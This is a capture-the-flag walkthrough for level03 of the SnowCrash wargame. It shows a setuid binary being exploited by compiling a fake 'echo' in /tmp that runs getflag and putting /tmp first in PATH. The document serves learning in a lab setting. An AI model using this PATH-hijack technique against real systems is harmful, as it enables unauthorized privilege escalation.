We run an "ls -l" Command to check what we got in our home directory.

level03@SnowCrash:~$ ls -l
total 12
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03

As we can see we have a binary which execute something using flag03 privileges.

We execute it:

level03@SnowCrash:~$ ./level03
Exploit me

So we need to find a way exploit the binary to directly run getflag command using this Binary.

1st we trace this binary using ltrace (https://www.thegeekdiary.com/how-to-use-strace-and-ltrace-commands-in-linux/):

level03@SnowCrash:~$ ltrace ./level03

As we can see, the binary runs a System function that calls the function echo from /env.

So all we have to do is create a fake echo that runs the command getflag for us, add it into $PATH so the system function use our Echo and execute it with flag03 privileges.

level03@SnowCrash:~$ vi /tmp/main.c

Put a simple .c code in it:

#include <stdlib.h>

int main()
{
	system("getflag");
	return (0);
}

Give it execution privileges:

level03@SnowCrash:~$ chmod 777 /tmp/main.c

Then we go to /tmp and compile the .c as echo

level03@SnowCrash:~$ cd /tmp
level03@SnowCrash:/tmp$ gcc main.c -o echo

Now all we have left to do is add the Exploit into $PATH

level03@SnowCrash:~$ export PATH="/tmp/:$PATH"

We execute the level03 binary and we should get our flag.

level03@SnowCrash:~$ ./level03
